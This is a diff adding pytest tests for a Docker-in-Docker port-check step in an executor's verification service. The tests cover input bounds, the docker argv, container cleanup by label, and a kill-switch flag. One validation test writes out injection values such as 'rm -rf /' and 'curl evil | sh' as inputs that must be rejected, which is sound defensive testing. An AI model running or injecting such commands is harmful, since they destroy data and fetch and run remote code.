@@ -26,12 +26,16 @@ from fastapi.testclient import TestClient
 from middlewares.miner import MinerMiddleware
 from payloads.verify import (
     CAPABILITY,
+    DIND_CAPABILITY,
     SCHEMA,
     DeviceChallenge,
+    DindData,
     DockerFacts,
     InspectorFacts,
+    DindStep,
     MatmulStep,
     PortFacts,
+    StepResult,
     VerifyIntentBody,
     VerifyResult,
     VerifySteps,
@@ -650,3 +654,337 @@ def test_canonical_message_is_the_shared_datura_definition():
 
     assert canonical_intent_message is local_verify_signing_blob
     assert SCHEMA == LOCAL_VERIFY_SCHEMA and CAPABILITY == LOCAL_VERIFY_CAPABILITY
+
+
+# --- phase 2c: the port-check DinD container started from the intent ---------------------------
+
+
+PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQ2b7l3kK5f5iFq3p0d9m4xX3oL0mYq6x2Ck5N4z1aB validator"
+
+
+def _dind(**overrides) -> DindStep:
+    fields = dict(name="container_hotkey_40003", port=40003, public_key=PUBKEY, sysbox=True)
+    fields.update(overrides)
+    return DindStep(**fields)
+
+
+def test_dind_step_is_bounded_on_the_wire():
+    for bad in (
+        dict(name="pod_x_1"),  # not the port check's prefix
+        dict(name="container_a; rm -rf /"),
+        dict(name="container_" + "a" * 101),
+        dict(port=0),
+        dict(port=70000),
+        dict(public_key="ssh-ed25519 AAAA; curl evil | sh"),
+        dict(public_key="ssh-dss AAAA"),
+        dict(public_key="ssh-rsa " + "A" * 1000),
+    ):
+        with pytest.raises(Exception):
+            _dind(**bad)
+
+
+def test_dind_step_accepts_the_validators_real_key_line_and_a_real_hotkey_name():
+    """The bounds come from datura, shared with the validator's own pre-send check; the key line
+    the validator mints (cryptography's OpenSSH ed25519 encoding) and `container_<ss58>_<port>`
+    must be accepted here, or the whole intent is a 422."""
+    from cryptography.hazmat.primitives import serialization
+    from cryptography.hazmat.primitives.asymmetric import ed25519
+    from datura.requests.validator_requests import LOCAL_VERIFY_DIND_NAME_PATTERN, LOCAL_VERIFY_DIND_PUBLIC_KEY_PATTERN
+
+    line = ed25519.Ed25519PrivateKey.generate().public_key().public_bytes(
+        encoding=serialization.Encoding.OpenSSH, format=serialization.PublicFormat.OpenSSH
+    ).decode().strip()
+    hotkey = bittensor.Keypair.create_from_uri("//Alice").ss58_address
+    step = DindStep(name=f"container_{hotkey}_65535", port=65535, public_key=line)
+    assert step.public_key == line
+    patterns = {
+        field: next(m.pattern for m in DindStep.model_fields[field].metadata if hasattr(m, "pattern"))
+        for field in ("name", "public_key")
+    }
+    assert patterns == {"name": LOCAL_VERIFY_DIND_NAME_PATTERN, "public_key": LOCAL_VERIFY_DIND_PUBLIC_KEY_PATTERN}
+
+
+def test_dind_argv_is_the_validators_run_dind_byte_for_byte_as_argv():
+    argv = lvs.dind_argv(_dind(), 40003)
+    assert argv[:3] == ["/usr/bin/docker", "run", "-d"]
+    assert "--runtime=sysbox-runc" in argv
+    assert argv[argv.index("--name") + 1] == "container_hotkey_40003"
+    assert argv[argv.index("-p") + 1] == "40003:22"
+    assert lvs.DIND_IMAGE in argv
+    assert argv[-3:-1] == ["sh", "-c"] and PUBKEY in argv[-1] and "service ssh start" in argv[-1]
+    assert "--runtime=sysbox-runc" not in lvs.dind_argv(_dind(sysbox=False), 40003)
+
+
+def test_dind_runs_only_on_one_of_this_executors_rental_ports(monkeypatch):
+    runs: list[list[str]] = []
+
+    async def fake_run_script(argv, *, timeout, env=None):
+        runs.append(argv)
+        return StepResult(status="ok", exit_status=0, stdout="cid\n")
+
+    removed: list[str] = []
+
+    async def fake_remove(name, container_id=None, run_token=None):
+        removed.append(name)
+
+    monkeypatch.setattr(lvs, "run_script", fake_run_script)
+    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
+    monkeypatch.setattr(lvs, "DIND_ORPHAN_TTL_SECONDS", 3600)
+    pairs = lvs.parse_port_range("40000-40009", None)
+
+    # outside the range, and — with sshd INSIDE the range — the sshd port itself
+    for port, ssh_port in ((39999, 2200), (40010, 2200), (40005, 40005)):
+        result = asyncio.run(lvs.run_dind(_dind(port=port), pairs, ssh_port))
+        assert result.status == "failed" and "rental ports" in result.error, (port, ssh_port)
+    assert runs == [] and removed == []
+
+    result = asyncio.run(lvs.run_dind(_dind(port=40003), pairs, 2200))
+    assert result.status == "ok"
+    assert result.data == DindData(container_name="container_hotkey_40003", port=40003, publish_port=40003)
+    assert len(runs) == 1 and runs[0][runs[0].index("-p") + 1] == "40003:22"
+    lvs._dind_orphan_timers.pop("container_hotkey_40003").cancel()
+
+
+def test_a_second_start_of_the_same_name_cancels_the_earlier_timer_and_each_removes_its_own_id(monkeypatch):
+    """The name is deterministic and the verify cadence ≈ the TTL: the earlier cycle's timer must
+    not fire on this cycle's fresh container. Cancelled on re-arm, and removal is by the container
+    id `docker run -d` printed, never by the shared name."""
+    cids = iter(["a" * 64, "b" * 64])
+
+    async def fake_run_script(argv, *, timeout, env=None):
+        return StepResult(status="ok", exit_status=0, stdout=next(cids) + "\n")
+
+    removed: list[tuple[str, str | None]] = []
+
+    async def fake_remove(name, container_id=None):
+        removed.append((name, container_id))
+
+    monkeypatch.setattr(lvs, "run_script", fake_run_script)
+    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
+    pairs = lvs.parse_port_range("40000-40009", None)
+
+    async def scenario():
+        await lvs.run_dind(_dind(), pairs, 2200)
+        first = lvs._dind_orphan_timers["container_hotkey_40003"]
+        await lvs.run_dind(_dind(), pairs, 2200)
+        second = lvs._dind_orphan_timers["container_hotkey_40003"]
+        assert first.cancelled() and not second.cancelled() and first is not second
+        second._run()  # fire the surviving timer now
+        await asyncio.sleep(0)
+        second.cancel()
+        return removed
+
+    assert asyncio.run(scenario()) == [("container_hotkey_40003", "b" * 64)]
+    lvs._dind_orphan_timers.pop("container_hotkey_40003", None)
+
+
+def test_a_cancelled_docker_run_still_removes_the_container_it_may_have_made(monkeypatch):
+    """The intent deadline cancels the step while `docker run -d` is in flight: the CLI is killed
+    but the daemon may hold a container of this name, or create it a moment after the first rm
+    found nothing — it is removed off the cancelled path, now and once more after the retry delay."""
+    removed: list[str] = []
+
+    async def hanging_run_script(argv, *, timeout, env=None):
+        await asyncio.sleep(30)
+
+    async def fake_remove(name, container_id=None, run_token=None):
+        removed.append(name)
+
+    monkeypatch.setattr(lvs, "run_script", hanging_run_script)
+    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
+    monkeypatch.setattr(lvs, "DIND_CANCELLED_RM_RETRY_SECONDS", 0.01)
+
+    async def scenario():
+        task = asyncio.create_task(lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 2200))
+        await asyncio.sleep(0.01)
+        task.cancel()
+        with pytest.raises(asyncio.CancelledError):
+            await task
+        await asyncio.sleep(0.05)  # the removal task runs: now, and again after the retry delay
+
+    asyncio.run(scenario())
+    assert removed == ["container_hotkey_40003", "container_hotkey_40003"]
+    assert "container_hotkey_40003" not in lvs._dind_orphan_timers  # no by-name timer is armed
+
+
+def test_the_late_removals_target_this_calls_container_only_never_the_name(monkeypatch):
+    """Regression: the delayed second removal ran `docker rm -fv <name>` after the answer had
+    left; the validator, reading `started=False`, may by then have started ITS OWN container under
+    that very name over SSH, and the retry killed the probe container. The `docker run` now carries
+    a per-call label and both removals resolve that label to ids — the bare name is never removed."""
+    seen: list[list[str]] = []
+    argv_seen: list[list[str]] = []
+
+    async def hanging_run_script(argv, *, timeout, env=None):
+        argv_seen.append(argv)
+        await asyncio.sleep(30)
+
+    class FakeProc:
+        returncode = 0
+
+        def __init__(self, argv):
+            seen.append(list(argv))
+
+        async def communicate(self):
+            # `docker ps -aq --filter label=…` answers one id of ours; the validator's same-named
+            # container has no such label and is not listed
+            return b"0123456789ab\n", b""
+
+        async def wait(self):
+            return 0
+
+    async def fake_exec(*argv, **kw):
+        return FakeProc(argv)
+
+    monkeypatch.setattr(lvs, "run_script", hanging_run_script)
+    monkeypatch.setattr(lvs.asyncio, "create_subprocess_exec", fake_exec)
+    monkeypatch.setattr(lvs, "DIND_CANCELLED_RM_RETRY_SECONDS", 0.01)
+
+    async def scenario():
+        task = asyncio.create_task(lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 2200))
+        await asyncio.sleep(0.01)
+        task.cancel()
+        with pytest.raises(asyncio.CancelledError):
+            await task
+        await asyncio.sleep(0.05)
+
+    asyncio.run(scenario())
+    label = next(a for a in argv_seen[0] if a.startswith(f"{lvs.DIND_RUN_LABEL}="))
+    token = label.split("=", 1)[1]
+    ps = [a for a in seen if a[:3] == ["/usr/bin/docker", "ps", "-aq"]]
+    rm = [a for a in seen if a[:3] == ["/usr/bin/docker", "rm", "-fv"]]
+    assert len(ps) == 2 and all(f"label={lvs.DIND_RUN_LABEL}={token}" in a for a in ps)
+    assert rm == [["/usr/bin/docker", "rm", "-fv", "0123456789ab"]] * 2
+    assert not any(a[-1] == "container_hotkey_40003" for a in rm)
+
+
+def test_a_failed_dind_run_removes_only_what_this_call_labelled_never_the_name(monkeypatch):
+    """Regression (fresh review, 11 Sep): `docker run` exits 125 with `Conflict. The container name
+    "/container_<hotkey>_<port>" is already in use` when another validator's probe of this miner
+    (or the validator's own SSH-started one) holds the name — the SAME name every validator derives.
+    A removal by bare name here would kill THEIR live container; by this call's label it removes
+    the half-made one (a bind failure after the create) and nothing else."""
+
+    async def fake_run_script(argv, *, timeout, env=None):
+        return StepResult(
+            status="failed", exit_status=125,
+            stderr_tail='docker: Error response from daemon: Conflict. The container name "/container_hotkey_40003" is already in use',
+        )
+
+    removed: list[tuple[str, str | None, str | None]] = []
+
+    async def fake_remove(name, container_id=None, run_token=None):
+        removed.append((name, container_id, run_token))
+
+    monkeypatch.setattr(lvs, "run_script", fake_run_script)
+    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
+    result = asyncio.run(lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 2200))
+    assert result.status == "failed"
+    (call,) = removed
+    assert call[0] == "container_hotkey_40003" and call[1] is None
+    assert call[2] is not None and len(call[2]) == 16, "keyed by this call's run token, not the shared name"
+    assert "container_hotkey_40003" not in lvs._dind_orphan_timers
+
+
+def test_dind_with_port_mappings_publishes_the_internal_port(monkeypatch):
+    async def fake_run_script(argv, *, timeout, env=None):
+        return StepResult(status="ok", exit_status=0, stdout="cid\n")
+
+    monkeypatch.setattr(lvs, "run_script", fake_run_script)
+    pairs = lvs.parse_port_range(None, json.dumps([[8001, 40001], [8002, 40002]]))
+    result = asyncio.run(lvs.run_dind(_dind(port=40002), pairs, 22))
+    assert result.status == "ok" and result.data.publish_port == 8002
+    lvs._dind_orphan_timers.pop("container_hotkey_40003").cancel()
+
+
+def test_a_failed_docker_run_removes_the_half_made_container_and_reports_it(monkeypatch):
+    async def fake_run_script(argv, *, timeout, env=None):
+        return StepResult(status="failed", exit_status=125, stderr_tail="port is already allocated")
+
+    removed: list[str] = []
+
+    async def fake_remove(name, container_id=None, run_token=None):
+        removed.append(name)
+
+    monkeypatch.setattr(lvs, "run_script", fake_run_script)
+    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
+    result = asyncio.run(lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 22))
+    assert result.status == "failed" and "already allocated" in result.stderr_tail
+    assert removed == ["container_hotkey_40003"]
+    assert "container_hotkey_40003" not in lvs._dind_orphan_timers
+
+
+def test_a_timed_out_docker_run_is_removed_twice_like_a_cancelled_one(monkeypatch):
+    """The CLI killed at the cap is the slow-daemon case: `containers/create` may land after the
+    first rm found nothing, so the name is removed again after the retry delay; no by-name timer."""
+    async def fake_run_script(argv, *, timeout, env=None):
+        return StepResult(status="timeout", error="timed out after 20 s")
+
+    removed: list[str] = []
+
+    async def fake_remove(name, container_id=None, run_token=None):
+        removed.append(name)
+
+    monkeypatch.setattr(lvs, "run_script", fake_run_script)
+    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
+    monkeypatch.setattr(lvs, "DIND_CANCELLED_RM_RETRY_SECONDS", 0.01)
+
+    async def scenario():
+        result = await lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 22)
+        await asyncio.sleep(0.05)
+        return result
+
+    result = asyncio.run(scenario())
+    assert result.status == "timeout"
+    assert removed == ["container_hotkey_40003", "container_hotkey_40003"]
+    assert "container_hotkey_40003" not in lvs._dind_orphan_timers
+
+
+def test_the_suite_answers_dind_only_when_asked(fake_scripts, fake_docker, monkeypatch):
+    async def fake_run_script(argv, *, timeout, env=None):
+        if argv[:2] == ["/usr/bin/docker", "run"]:
+            return StepResult(status="ok", exit_status=0, stdout="cid\n")
+        return StepResult(status="ok", exit_status=0, stdout="x")
+
+    monkeypatch.setattr(lvs, "run_script", fake_run_script)
+    without = asyncio.run(_service(dind_enabled=True).run(_body(steps=VerifySteps(docker=True))))
+    assert "dind" not in without.steps
+    with_dind = asyncio.run(_service(dind_enabled=True).run(_body(steps=VerifySteps(dind=_dind()))))
+    assert with_dind.steps["dind"].status == "ok"
+    assert with_dind.steps["dind"].data.container_name == "container_hotkey_40003"
+    lvs._dind_orphan_timers.pop("container_hotkey_40003").cancel()
+
+
+def test_the_executor_flag_is_a_kill_switch_a_signed_intent_cannot_bypass(fake_scripts, fake_docker, monkeypatch):
+    """EXECUTOR_LOCAL_VERIFY_DIND_ENABLED=false (the default): the step is answered `skipped`,
+    never run — no `docker run` for any intent, whoever signed it. The route builds the service
+    from the setting."""
+    runs: list[list[str]] = []
+
+    async def fake_run_script(argv, *, timeout, env=None):
+        runs.append(argv)
+        return StepResult(status="ok", exit_status=0, stdout="x")
+
+    monkeypatch.setattr(lvs, "run_script", fake_run_script)
+    answer = asyncio.run(_service().run(_body(steps=VerifySteps(docker=True, dind=_dind()))))
+    assert answer.steps["dind"].status == "skipped" and "not enabled" in answer.steps["dind"].error
+    assert answer.steps["docker"].status == "ok"  # the rest of the intent is answered as before
+    assert not any(argv[:2] == ["/usr/bin/docker", "run"] for argv in runs)
+    assert "container_hotkey_40003" not in lvs._dind_orphan_timers
+
+    monkeypatch.setattr(apis_module, "_local_verify_service", None)
+    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_DIND_ENABLED", False)
+    assert apis_module._get_local_verify_service().dind_enabled is False
+    monkeypatch.setattr(apis_module, "_local_verify_service", None)
+    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_DIND_ENABLED", True)
+    assert apis_module._get_local_verify_service().dind_enabled is True
+    monkeypatch.setattr(apis_module, "_local_verify_service", None)
+
+
+def test_version_advertises_dind_only_with_its_own_flag(client, monkeypatch):
+    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_DIND_ENABLED", False)
+    assert client.get("/version").json()["capabilities"] == [CAPABILITY]
+    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_DIND_ENABLED", True)
+    assert client.get("/version").json()["capabilities"] == [CAPABILITY, DIND_CAPABILITY]
+    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_ENABLED", False)
+    assert client.get("/version").json()["capabilities"] == []
